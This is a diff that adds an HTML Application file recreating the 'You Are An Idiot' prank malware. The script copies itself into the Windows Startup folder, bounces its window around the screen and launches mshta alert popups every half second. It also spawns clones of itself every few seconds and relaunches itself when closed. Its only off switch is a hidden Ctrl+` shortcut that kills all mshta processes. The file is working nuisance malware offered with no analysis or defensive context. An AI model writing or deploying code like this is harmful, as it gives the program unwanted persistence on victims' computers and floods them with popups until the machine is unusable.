@@ -1,0 +1,98 @@
+﻿<html>
+<head>
+  <title>YOUAREANIDIOT</title>
+  <HTA:APPLICATION
+    APPLICATIONNAME="DONTBEANIDIOT"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="no"
+    BORDER="thin"
+    WINDOWSTATE="normal"
+    SYSMENU="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    SCROLL="no"
+/>
+
+<script language="VBScript">
+  Dim shell, fso, x, y, dx, dy, w, h, screenW, screenH, bounceTimer
+  Set shell = CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
+
+  ' Window size and position
+  w = 480
+  h = 240
+  x = 300
+  y = 300
+  dx = 6
+  dy = 4
+  screenW = screen.availWidth - w
+  screenH = screen.availHeight - h
+
+  ' Copy to Startup
+  startupPath = shell.SpecialFolders("Startup") & "\youareanidiot.hta"
+  thisPath = Replace(window.location.href, "file:///", "")
+  thisPath = Replace(thisPath, "/", "\")
+  If Not fso.FileExists(startupPath) Then
+    fso.CopyFile thisPath, startupPath
+  End If
+
+  ' Bounce logic
+  Sub Bounce()
+    x = x + dx
+    y = y + dy
+    If x <= 0 Or x >= screenW Then dx = -dx
+    If y <= 0 Or y >= screenH Then dy = -dy
+    window.moveTo x, y
+  End Sub
+
+  Sub OnLoad()
+    window.resizeTo w, h
+    bounceTimer = window.setInterval("Bounce", 50)
+  End Sub
+
+  Sub OnClose()
+    shell.Run "mshta.exe """ & window.location.href & """", 1, False
+  End Sub
+
+  Sub SpawnClone()
+    shell.Run "mshta.exe """ & window.location.href & """", 1, False
+  End Sub
+</script>
+
+<script language="javascript">
+  // === CONSTANT POPUPS: Every 0.5 seconds
+  setInterval(function () {
+    var popup = 'mshta.exe "javascript:alert(\'YOU WHERE AN IDIOT!\');close();"';
+    new ActiveXObject("WScript.Shell").Run(popup, 0, false);
+  }, 500);
+
+  // === Optional clone spawning every 10 sec
+  setInterval(function () {
+    try {
+      window.external.SpawnClone();
+    } catch (e) {
+      new ActiveXObject("WScript.Shell").Run("mshta.exe \"" + window.location.href + "\"", 1, false);
+    }
+  }, 3000);
+  // === Failsafe: Ctrl + ` kills all instances
+document.onkeydown = function (e) {
+  e = e || window.event;
+  if (e.ctrlKey && e.keyCode === 192) {
+    // Kill all HTAs
+    try {
+      new ActiveXObject("WScript.Shell").Run("taskkill /f /im mshta.exe", 0, false);
+    } catch (err) {
+      alert("Failsafe failed: " + err.message);
+    }
+  }
+};
+</script>
+</head>
+
+<body onload="OnLoad()" onunload="OnClose()" style="margin:0; padding:0; background:#ff0000; color:white; font-family:Comic Sans MS; display:flex; align-items:center; justify-content:center;">
+  <div style="width:100%; height:100%; text-align:center;">
+    <h2>😂 YOU ARE AN IDIOT 😂</h2>
+    <p>(Popups will never stop)</p>
+  </div>
+</body>
+</html>
